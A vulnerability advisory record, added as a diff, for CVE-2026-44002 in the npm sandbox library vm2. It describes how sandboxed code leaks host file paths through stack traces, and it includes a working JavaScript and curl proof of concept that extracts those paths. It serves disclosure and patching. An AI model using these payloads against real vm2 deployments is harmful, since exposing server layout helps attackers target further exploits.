@@ -1,0 +1,171 @@
+advisory_id: GHSA-v27g-jcqj-v8rw
+datasource_id: github_osv/GHSA-v27g-jcqj-v8rw
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-v27g-jcqj-v8rw/GHSA-v27g-jcqj-v8rw.json
+aliases:
+  - CVE-2026-44002
+summary: |
+  vm2 is Vulnerable to Host File Path Disclosure via Stack Trace Information Leak
+  ### Summary
+  vm2's `CallSite` wrapper class (intended as a safe wrapper for V8's native CallSite) blocks `getThis()` and `getFunction()` to prevent host object leakage, but allows `getFileName()` to return unsanitized host absolute paths. Any sandboxed code can extract the full directory structure, library paths, and framework versions of the host server.
+
+  ### Details
+  In `lib/setup-sandbox.js:436-466`, the `CallSite` class overrides `getThis()` and `getFunction()` with `undefined` to prevent host object references from leaking into the sandbox. However, the following methods pass through unsanitized values from the original V8 CallSite object:
+
+  - `getFileName()` — returns host absolute paths like `/app/node_modules/vm2/lib/vm.js`
+  - `getLineNumber()`, `getColumnNumber()` — exact source locations
+  - `getFunctionName()`, `getMethodName()`, `getTypeName()` — internal function names
+
+  Two exploitation paths exist:
+  1. **Default `error.stack`**: `new Error().stack` includes host frame paths in the formatted string
+  2. **Custom `prepareStackTrace`**: Attacker can set `Error.prepareStackTrace` to directly call `getFileName()` on each CallSite, extracting a clean list of all host paths
+
+  ### PoC
+
+  **Library-level PoC (Node.js script — primary):**
+  ```javascript
+  const { VM } = require("vm2");
+  const vm = new VM();
+
+  // Path A — Default error.stack
+  const result1 = vm.run(`try { null.x; } catch(e) { e.stack }`);
+  console.log(result1);
+  // Output includes: /app/node_modules/vm2/lib/vm.js:289:18
+  //                   /app/src/server.js:49:20
+
+  // Path B — prepareStackTrace extraction
+  const result2 = vm.run(`
+    Error.prepareStackTrace = function(e, sst) {
+      return sst.map(function(s) { return s.getFileName(); }).join(", ");
+    };
+    new Error().stack
+  `);
+  console.log(result2);
+  // Output: vm.js, node:vm, /app/node_modules/vm2/lib/vm.js, /app/src/sandbox.js, ...
+  ```
+
+  **HTTP demonstration:**
+  ```bash
+  # Default error.stack
+  curl -s -X POST http://localhost:3000/api/execute \
+    -H "Content-Type: application/json" \
+    -d '{"code":"try { null.x; } catch(e) { e.stack }"}'
+  # Result includes host paths: /app/src/server.js, /app/node_modules/express/...
+
+  # prepareStackTrace extraction
+  curl -s -X POST http://localhost:3000/api/execute \
+    -H "Content-Type: application/json" \
+    -d '{"code":"Error.prepareStackTrace = function(e, sst) { return sst.map(function(s) { return s.getFileName(); }).join(\", \"); }; new Error().stack"}'
+  # Result: /app/node_modules/vm2/lib/vm.js, /app/src/sandbox.js, /app/src/server.js, ...
+  ```
+
+  ### Impact
+  - **Information Disclosure**: Host directory structure, library paths, framework versions, and internal architecture are exposed to sandboxed code.
+  - **Attack Chain**: Leaked paths enable precise targeting for other vulnerabilities.
+  - **Scope**: All applications using vm2. No special configuration required.
+impacted_packages:
+  - purl: pkg:npm/vm2
+    affected_versions: vers:npm/<=3.10.5
+    fixed_versions: vers:npm/3.11.0
+    affected_packages:
+      - pkg:npm/vm2@0.1.0
+      - pkg:npm/vm2@0.1.1
+      - pkg:npm/vm2@0.2.0
+      - pkg:npm/vm2@0.2.1
+      - pkg:npm/vm2@0.2.2
+      - pkg:npm/vm2@0.2.3
+      - pkg:npm/vm2@0.2.4
+      - pkg:npm/vm2@1.0.0
+      - pkg:npm/vm2@1.0.1
+      - pkg:npm/vm2@2.0.0
+      - pkg:npm/vm2@2.0.2
+      - pkg:npm/vm2@3.0.0
+      - pkg:npm/vm2@3.0.1
+      - pkg:npm/vm2@3.1.0
+      - pkg:npm/vm2@3.2.0
+      - pkg:npm/vm2@3.3.0
+      - pkg:npm/vm2@3.3.1
+      - pkg:npm/vm2@3.4.0
+      - pkg:npm/vm2@3.4.1
+      - pkg:npm/vm2@3.4.2
+      - pkg:npm/vm2@3.4.3
+      - pkg:npm/vm2@3.4.4
+      - pkg:npm/vm2@3.4.5
+      - pkg:npm/vm2@3.4.6
+      - pkg:npm/vm2@3.5.0
+      - pkg:npm/vm2@3.5.1
+      - pkg:npm/vm2@3.5.2
+      - pkg:npm/vm2@3.6.0
+      - pkg:npm/vm2@3.6.1
+      - pkg:npm/vm2@3.6.2
+      - pkg:npm/vm2@3.6.3
+      - pkg:npm/vm2@3.6.4
+      - pkg:npm/vm2@3.6.5
+      - pkg:npm/vm2@3.6.6
+      - pkg:npm/vm2@3.6.7
+      - pkg:npm/vm2@3.6.8
+      - pkg:npm/vm2@3.6.9
+      - pkg:npm/vm2@3.6.10
+      - pkg:npm/vm2@3.6.11
+      - pkg:npm/vm2@3.7.0
+      - pkg:npm/vm2@3.8.0
+      - pkg:npm/vm2@3.8.1
+      - pkg:npm/vm2@3.8.2
+      - pkg:npm/vm2@3.8.3
+      - pkg:npm/vm2@3.8.4
+      - pkg:npm/vm2@3.9.0
+      - pkg:npm/vm2@3.9.1
+      - pkg:npm/vm2@3.9.2
+      - pkg:npm/vm2@3.9.3
+      - pkg:npm/vm2@3.9.4
+      - pkg:npm/vm2@3.9.5
+      - pkg:npm/vm2@3.9.6
+      - pkg:npm/vm2@3.9.7
+      - pkg:npm/vm2@3.9.8
+      - pkg:npm/vm2@3.9.9
+      - pkg:npm/vm2@3.9.10
+      - pkg:npm/vm2@3.9.11
+      - pkg:npm/vm2@3.9.12
+      - pkg:npm/vm2@3.9.13
+      - pkg:npm/vm2@3.9.14
+      - pkg:npm/vm2@3.9.15
+      - pkg:npm/vm2@3.9.16
+      - pkg:npm/vm2@3.9.17
+      - pkg:npm/vm2@3.9.18
+      - pkg:npm/vm2@3.9.19
+      - pkg:npm/vm2@3.10.0
+      - pkg:npm/vm2@3.10.1
+      - pkg:npm/vm2@3.10.2
+      - pkg:npm/vm2@3.10.3
+      - pkg:npm/vm2@3.10.4
+      - pkg:npm/vm2@3.10.5
+    fixed_packages:
+      - pkg:npm/vm2@3.11.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '5.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-v27g-jcqj-v8rw/GHSA-v27g-jcqj-v8rw.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-209
+references:
+  - url: https://github.com/patriksimek/vm2
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/releases/tag/v3.11.0
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-44002
+    reference_type:
+    reference_id: CVE-2026-44002
+  - url: https://github.com/patriksimek/vm2/security/advisories/GHSA-v27g-jcqj-v8rw
+    reference_type:
+    reference_id: GHSA-v27g-jcqj-v8rw
+exploits: []
